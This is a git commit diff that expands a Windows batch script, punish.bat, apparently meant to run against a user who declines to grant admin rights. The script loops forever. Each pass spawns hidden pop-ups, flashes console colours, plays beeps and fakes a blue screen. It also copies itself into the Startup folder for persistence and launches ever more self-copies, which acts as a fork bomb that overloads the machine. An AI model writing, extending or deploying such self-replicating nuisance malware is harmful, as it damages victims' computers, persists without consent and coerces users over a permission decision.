a3c67b70b4d76a5614b0b305841737ac73409370
Klaas2811 <klaasbakker2811@gmail.com>
2025-08-16 11:30:16 +0200

    punish.bat
    If u give no admin

--- punish.bat
+++ punish.bat
@@ -1,22 +1,34 @@
 @echo off
-title You messed up!
+title You messed up! Max Punish
 
 :loop
-:: Spawn a hidden popup
-start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You denied admin, deal with it!','Punishment')"
 
-:: Copy itself to startup folder
-copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\punish.bat" >nul
+:: === Hidden pop-ups ===
+for /l %%i in (1,1,5) do (
+    start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('You denied admin!','Punishment')"
+)
 
-:: Create 3 clones for overload
-copy "%~f0" "%~dp0punish1.bat" >nul
-copy "%~f0" "%~dp0punish2.bat" >nul
-copy "%~f0" "%~dp0punish3.bat" >nul
+:: === Disco console ===
+for /l %%i in (1,1,20) do (
+    color 0%%i
+    ping localhost -n 1 >nul
+)
+color 0A
 
-:: Start clones
-start "" "%~dp0punish1.bat"
-start "" "%~dp0punish2.bat"
-start "" "%~dp0punish3.bat"
+:: === Beep spam ===
+powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"
+
+:: === Fake BSOD in console ===
+start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"
+
+:: === Copy self to user Startup (persistent) ===
+copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" /Y >nul
+
+:: === Create clones for extra load ===
+for %%x in (1,2,3) do (
+    copy "%~f0" "%~dp0punish%%x.bat" /Y >nul
+    start "" "%~dp0punish%%x.bat"
+)
 
 timeout /t 1 >nul
 goto loop
